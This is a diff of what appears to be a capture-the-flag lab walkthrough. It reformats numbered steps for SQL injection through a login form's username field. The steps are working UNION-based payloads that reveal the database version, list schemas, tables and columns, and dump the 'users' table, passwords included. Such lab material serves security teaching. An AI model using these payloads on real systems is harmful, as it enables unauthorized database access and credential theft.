@@ -30,23 +30,25 @@ Open web browser and visit:
     - `username`: `' UNION SELECT null,@@version#`
     - `password`: `anythingyouwant`
 
-Dump all server databases
+4. Dump all server databases
 
-' UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata; #
+   - `username`: `' UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata; #`
+   - `password`: `anythingyouwant`
 
-Dump all tables in a database (here: capturethefenelon)
+5. Dump all tables in a database (here: capturethefenelon)
 
-' UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='capturethefenelon' #
+   - `username`: `' UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='capturethefenelon' #`
+   - `password`: `anythingyouwant`
 
+6. Dump all columns names in a table (here: users)
 
-Dump all columns names in a table (here: users)
+   - `username`: `' UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='users' #`
+   - `password`: `anythingyouwant`
 
-' UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='users' #
+7. Dump all data in a table (here: users)
 
-
-Dump all datas
-
-' UNION ALL SELECT NULL,concat(0x28,username,0x3a,first_name,0x3a,last_name,0x3a,password,0x29) FROM users #
+   - `username`: `' UNION ALL SELECT NULL,concat(0x28,username,0x3a,first_name,0x3a,last_name,0x3a,password,0x29) FROM users #`
+   - `password`: `anythingyouwant`
 
 
 
